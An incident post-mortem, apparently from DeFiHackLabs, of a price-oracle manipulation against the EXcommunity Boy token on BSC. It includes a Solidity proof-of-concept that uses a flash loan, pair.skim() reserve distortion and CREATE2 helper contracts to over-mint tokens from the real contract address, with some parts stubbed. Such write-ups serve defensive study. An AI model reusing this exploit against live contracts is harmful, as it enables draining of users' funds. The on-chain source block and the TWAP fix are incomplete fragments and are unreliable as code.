# EXcommunity — getPrice() + CREATE2 Price Oracle Manipulation Analysis

| Field | Details |
|------|------|
| **Date** | 2024-05 |
| **Protocol** | EXcommunity (Boy/Girl Token) |
| **Chain** | BSC |
| **Loss** | ~33 BNB |
| **Vulnerable Contract** | [Boy 0xdf4895CD](https://bscscan.com/address/0xdf4895Cd8247284Ae3a7b3E28cf6c03113fADa5f) |
| **Vulnerable Contract** | [Girl 0xb1de93DA](https://bscscan.com/address/0xb1de93DAe1CDdF429eEc9DB30b78759d17495758) |
| **Root Cause** | The Boy token's `getPrice()` function uses DEX pair spot reserves, allowing an attacker to manipulate reserves via `skim()` and then call `buy()` through 10 helper contracts deployed with CREATE2 to mint an excessive amount of Boy tokens at a distorted price |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-05/EXcommunity_exp.sol) |

---

## 1. Vulnerability Overview

EXcommunity's Boy token calls `getPrice()` inside the `buy()` function to calculate the number of Boy tokens to mint relative to BNB. Because `getPrice()` is based on the spot reserves of a Uniswap V2 pair, it is manipulable via `skim()`. The attacker flash-borrowed 400,000 BUSDT, bought Girl tokens and transferred them to the pair, then called `skim()` to distort the Boy pair reserves. Ten helper contracts were deployed via CREATE2, each calling `buy()` to mint a large quantity of Boy tokens at the manipulated price, which were then swapped for BNB.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: getPrice uses spot reserves
contract BoyToken {
    IUniswapV2Pair public pair;

    function getPrice() public view returns (uint256) {
        (uint112 r0, uint112 r1,) = pair.getReserves();
        // ← r0, r1 can be manipulated via skim()
        return uint256(r1) * 1e18 / uint256(r0);
    }

    function buy() external payable {
        uint256 price = getPrice();  // manipulated spot price
        uint256 mintAmount = msg.value * 1e18 / price;
        _mint(msg.sender, mintAmount);  // over-minting
    }
}

// ✅ Safe code: TWAP-based price
function getPrice() public view returns (uint256) {
    // 30-minute TWAP
    (uint256 price0Cumulative, uint256 price1Cumulative, uint32 blockTimestamp) =
        UniswapV2OracleLibrary.currentCumulativePrices(address(pair));
    // TWAP calculation...
    return twapPrice;
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: EXcommunity_decompiled.sol
contract EXcommunity {
    function getPrice() external view returns (uint256) {}  // ❌ vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] V3 Flash Loan: 400,000 BUSDT
  │
  ├─→ [2] BUSDT → Girl Token swap
  │
  ├─→ [3] Transfer Girl tokens to Boy/Girl pair
  │
  ├─→ [4] pair.skim() → Boy pair reserves distorted
  │         └─ getPrice() return value distorted
  │
  ├─→ [5] Deploy 10 Money helper contracts via CREATE2
  │
  ├─→ [6] Each helper calls buy{value: 3 BNB}()
  │         └─ Manipulated low price → Boy tokens over-minted
  │
  ├─→ [7] Boy tokens → WBNB reverse swap
  │
  ├─→ [8] Repay V3 flash loan
  │
  └─→ [9] ~33 BNB profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IBoyToken {
    function buy() external payable;
    function getPrice() external view returns (uint256);
}

interface IPancakePair {
    function skim(address to) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

contract Money {
    IBoyToken constant boy = IBoyToken(0xdf4895Cd8247284Ae3a7b3E28cf6c03113fADa5f);

    // Helper contract deployed via CREATE2
    function buy() external payable {
        boy.buy{value: msg.value}();
        // Transfer minted Boy tokens back to attacker
        IERC20(address(boy)).transfer(msg.sender, IERC20(address(boy)).balanceOf(address(this)));
    }

    receive() external payable {}
}

contract AttackContract {
    IBoyToken    constant boy  = IBoyToken(0xdf4895Cd8247284Ae3a7b3E28cf6c03113fADa5f);
    IPancakePair constant pair = IPancakePair(/* Boy/Girl pair */);

    function testExploit() external {
        // [1] Flash loan + buy Girl tokens
        flashLoanAndBuyGirl(400_000e18);

        // [2] Transfer Girl → pair + manipulate reserves via skim
        IERC20(girl).transfer(address(pair), girlAmount);
        pair.skim(address(this));

        // [3] Deploy 10 helpers via CREATE2 + call buy
        for (uint i = 0; i < 10; i++) {
            bytes32 salt = bytes32(i);
            Money m = new Money{salt: salt}();
            m.buy{value: 3 ether}();
        }

        // [4] Boy → WBNB reverse swap
        uint256 boyBal = IERC20(address(boy)).balanceOf(address(this));
        swapBoyToWBNB(boyBal);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Spot price oracle manipulation (skim + CREATE2) |
| **CWE** | CWE-829: Inclusion of Functionality from Untrusted Control Sphere |
| **Attack Vector** | External (flash loan + skim + CREATE2 helpers) |
| **DApp Category** | Game/social token minting contract |
| **Impact** | Boy token over-minting → BNB drained (~33 BNB) |

## 6. Remediation Recommendations

1. **Apply TWAP Oracle**: Replace `getPrice()` with a 30-minute TWAP
2. **Disable skim**: Disable `skim()` on the price-reference pair
3. **Minimum Purchase Interval**: Limit the number of `buy()` calls per address/block
4. **Price Deviation Guard**: Block trades when the spot price deviates beyond a set percentage from the TWAP

## 7. Lessons Learned

- When `getPrice()` references DEX spot reserves, it is manipulable via `skim()`; this is a recurring pattern seen in WSM, ZongZi, and others.
- Deploying multiple contracts via CREATE2 is a standard technique for bypassing single-address restrictions.
- Every pricing function that determines token mint amounts must use a manipulation-resistant oracle.